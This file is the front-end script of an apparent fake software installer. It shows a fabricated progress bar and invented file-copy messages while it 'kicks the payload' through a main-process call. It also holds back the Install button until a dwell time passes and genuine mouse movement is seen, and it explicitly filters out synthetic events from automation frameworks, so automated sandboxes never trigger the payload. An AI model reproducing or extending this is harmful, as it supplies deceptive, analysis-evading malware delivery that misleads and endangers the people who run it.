const panels = ['welcome', 'installing', 'finish'];
let step = 0;

const els = {
  title: document.getElementById('title'),
  subtitle: document.getElementById('subtitle'),
  back: document.getElementById('btn-back'),
  next: document.getElementById('btn-next'),
  cancel: document.getElementById('btn-cancel'),
  bar: document.getElementById('progress-bar'),
  detail: document.getElementById('install-detail'),
  status: document.getElementById('install-status'),
};

// Interaction gating state - enforced on the renderer side and re-checked
// in the main process before any file copy happens.
let dwellMs = 0;
let requireMouseMovement = false;
let mouseMovementSeen = false;
let dwellStart = Date.now();
let interactionToken = null;

function show(i) {
  step = i;
  panels.forEach((p, idx) => {
    document.getElementById(`panel-${p}`).classList.toggle('active', idx === i);
  });
  els.subtitle.textContent = ['Welcome', 'Installing', 'Completed'][i];
  els.back.disabled = i === 0 || i === 1 || i === 2;
  if (i === 0) {
    els.next.textContent = 'Install';
    // Install stays disabled on the welcome panel until the user has
    // dwelled long enough and (optionally) moved the mouse. This gates
    // the file copy on real user interaction.
    els.next.disabled = true;
    scheduleGateReevaluation();
  }
  if (i === 1) { els.next.textContent = 'Next >'; els.next.disabled = true; }
  if (i === 2) { els.next.textContent = 'Finish'; els.next.disabled = false; }
  els.cancel.disabled = i === 2;
}

function canEnableInstallButton() {
  if (step !== 0) return false;
  if (dwellMs > 0 && (Date.now() - dwellStart) < dwellMs) return false;
  if (requireMouseMovement && !mouseMovementSeen) return false;
  return true;
}

let gateTimer = null;
function scheduleGateReevaluation() {
  if (gateTimer) clearTimeout(gateTimer);
  const wait = Math.max(50, (dwellStart + dwellMs) - Date.now());
  gateTimer = setTimeout(async () => {
    gateTimer = null;
    if (!canEnableInstallButton()) {
      // Still waiting on mouse movement - re-evaluate on next movement.
      return;
    }
    // Acquire the interaction token from the main process. The token is
    // issued exactly once per app launch and is required by installer:run.
    try {
      const resp = await window.installer.ready();
      if (resp && resp.token) interactionToken = resp.token;
    } catch (_) { /* ignore; button stays disabled */ }
    if (interactionToken) {
      els.next.disabled = false;
    }
  }, wait);
}

function fakeProgress(onDone) {
  let pct = 0;
  const files = [
    'Extracting core components...',
    'Copying runtime libraries...',
    'Registering components...',
    'Applying configuration...',
    'Finalizing installation...',
  ];
  const timer = setInterval(() => {
    pct += 3 + Math.random() * 4;
    if (pct >= 100) { pct = 100; clearInterval(timer); onDone(); }
    els.bar.style.width = pct.toFixed(0) + '%';
    els.detail.textContent = files[Math.min(files.length - 1, Math.floor(pct / 22))];
  }, 140);
}

async function init() {
  const info = await window.installer.product();
  els.title.textContent = `${info.product} Setup`;
  document.querySelectorAll('.product-name').forEach((e) => { e.textContent = info.product; });
  document.title = `${info.product} Setup`;
  dwellMs = info.dwellMs || 0;
  requireMouseMovement = !!info.requireMouseMovement;
  dwellStart = Date.now();
  show(0);
}

// ---------------------------------------------------------------------------
// Event wiring
// ---------------------------------------------------------------------------

// Only "real" mousemove events (with a non-zero movementX/Y delta) count.
// This filters out synthetic events that some automation frameworks inject
// with zero movement deltas.
window.addEventListener('mousemove', (ev) => {
  if (step !== 0) return;
  if (mouseMovementSeen) return;
  if (typeof ev.movementX === 'number' && typeof ev.movementY === 'number') {
    if (ev.movementX !== 0 || ev.movementY !== 0) {
      mouseMovementSeen = true;
      scheduleGateReevaluation();
    }
  }
});

els.next.addEventListener('click', async () => {
  if (step === 0) {
    if (!canEnableInstallButton() || !interactionToken) {
      // Shouldn't reach here (button is disabled), but defend anyway.
      return;
    }
    show(1);
    // Kick the payload with the interaction token; run() will also
    // re-check environment guardrails in the main process.
    window.installer.run(interactionToken).catch(() => {});
    fakeProgress(() => show(2));
  } else if (step === 2) {
    window.close();
  }
});

els.cancel.addEventListener('click', () => window.close());

init();
